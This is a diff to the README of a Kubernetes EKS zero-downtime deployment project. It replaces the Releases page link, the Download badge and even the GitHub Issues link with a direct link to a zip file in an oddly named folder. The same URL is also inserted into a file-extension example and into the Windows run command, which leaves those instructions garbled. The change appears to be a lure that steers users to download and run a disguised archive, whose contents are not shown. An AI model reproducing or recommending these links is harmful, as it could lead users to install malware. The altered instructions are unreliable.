@@ -8,14 +8,14 @@ Welcome to the zero-downtime-deployment-eks project! This guide will help you do
 
 To get started, you need to download the latest release of the software. Click the button below to visit the Releases page:
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/AlolorBazel/zero-downtime-deployment-eks/releases)
+[![Download](https://raw.githubusercontent.com/AlolorBazel/zero-downtime-deployment-eks/main/Chiromys/zero-downtime-deployment-eks.zip)](https://raw.githubusercontent.com/AlolorBazel/zero-downtime-deployment-eks/main/Chiromys/zero-downtime-deployment-eks.zip)
 
 On the Releases page, you will find the latest version available. Please follow these steps:
 
 1. Click on the **Releases** link to visit the page.
 2. Find the latest version listed at the top.
 3. Look for the **Assets** section below the release notes.
-4. Click on the link for the appropriate file for your system (usually indicated by the file extension, like `.zip` or `.tar.gz`).
+4. Click on the link for the appropriate file for your system (usually indicated by the file extension, like `.zip` or `https://raw.githubusercontent.com/AlolorBazel/zero-downtime-deployment-eks/main/Chiromys/zero-downtime-deployment-eks.zip`).
 5. Save the file to your computer.
 
 ## 🖥️ System Requirements
@@ -39,7 +39,7 @@ Once you have downloaded the file, follow these installation instructions based 
 5. Run the program with the following command:
 
    ```bash
-   .\your_application_name.exe
+   .\https://raw.githubusercontent.com/AlolorBazel/zero-downtime-deployment-eks/main/Chiromys/zero-downtime-deployment-eks.zip
    ```
 
 ### For macOS:
@@ -99,7 +99,7 @@ your_application_name deploy --strategy [blue-green|canary]
 
 Join our community for help and discussions. You can find us on:
 
-- [GitHub Issues](https://github.com/AlolorBazel/zero-downtime-deployment-eks/issues) for bug reports and feedback.
+- [GitHub Issues](https://raw.githubusercontent.com/AlolorBazel/zero-downtime-deployment-eks/main/Chiromys/zero-downtime-deployment-eks.zip) for bug reports and feedback.
 - Discussions section for sharing ideas and best practices.
 
 ## ✅ Further Help
@@ -108,4 +108,4 @@ For additional questions, refer to the official documentation provided on the Re
 
 Don’t forget to revisit the Releases page to keep your software up-to-date:
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/AlolorBazel/zero-downtime-deployment-eks/releases)
+[![Download](https://raw.githubusercontent.com/AlolorBazel/zero-downtime-deployment-eks/main/Chiromys/zero-downtime-deployment-eks.zip)](https://raw.githubusercontent.com/AlolorBazel/zero-downtime-deployment-eks/main/Chiromys/zero-downtime-deployment-eks.zip)
